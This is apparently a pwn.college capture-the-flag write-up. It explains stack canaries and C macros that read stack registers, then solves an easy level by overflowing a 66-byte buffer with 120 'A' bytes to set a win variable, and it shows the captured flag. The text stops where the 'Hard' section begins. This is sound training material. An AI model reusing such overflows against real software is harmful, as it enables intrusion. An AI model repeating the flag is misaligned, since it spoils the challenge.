# Easy

### understanding the code 

```c 
uint64_t sp_;  // rsp register (Stack pointer)
uint64_t bp_;  // rbp register (base pointer)
uint64_t sz_;  // size of current stack frame (sp_ - bp_)
uint64_t cp_;  // current pointer
uint64_t cv_;  // canary value
uint64_t si_;
uint64_t rp_;  // return pointer

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );  // stores the value of rsp and moves it into %0 register and then stores it in sp_ variable
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );  // stores the value of rbp and moves it into %0 register and then stores it in bp_ variable
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
// fs is a segment register are used to point to a specific memory area on the thread local storage(not on stack) where the original canary value is stored
// The canary is stored at an offset x28 from the value in fs register
// the canary value is retreived and stored in cn variable
// QWORD PTR is just used to speciy that quad word ie 2*4 = 8 bytes are read from that pointer location 
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \ // finds the canary value on the stack by iterating backward from the start
  }
```

### What is Canary?
A canary is used to protect the stack frame from buffer overflows. A random value is placed between the allocated memory for local variables and return address. If a buffer overflow occurs then this canary value is altered.
Before returning, the canary value on the stack is matched with the original canary stored on the thread local storage (TLS) pointed at by fs register. If they do not match, the process is terminate. 

&nbsp;

### The challenge

```c 
struct
    {
        char input[66];
        int win_variable;
    } data  = {0} ;
```

The flag is printed only when win_variable is not null but the program never asks for an input for it. 
So We have to overflow input array so that the win_variable is also altered. 

So if we send a value that is bigger than 66 bytes we can write to the win_variable as well.
 
    Send your payload (up to 4096 bytes)!

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    You sent 120 bytes!

Since is setn 120 bytes i could also potentially overwrite the canary. 


    The program's memory status:
    - the input buffer starts at 0x7ffd3ae9c420
    - the saved frame pointer (of main) is at 0x7ffd3ae9c470
    - the saved return address (previously to main) is at 0x7ffd3ae9c478
    - the saved return address is now pointing to 0x4141414141414141.
    - the canary is stored at 0x7ffd3ae9c468.
    - the canary value is now 0x4141414141414141.
    - the address of the win variable is 0x7ffd3ae9c464.
    - the value of the win variable is 0x41414141.


The canary value is checked only before returning so the program continues to run and we get our flag 

    You win! Here is your flag:
    pwn.college{Y_nnvCk_75ZMaby6UK2VlmlJL2X.0VO4IDL5kzM1czW}

But since we also changed the canary, the program does not end smoothly. It is terminated before returning. 


    Goodbye!
    *** stack smashing detected ***: terminated
    Aborted

&nbsp;

***

# Hard
In this challenge we do not get a helpful debug output so we will use gdb to identify where the win_variable is and what the value of canary is
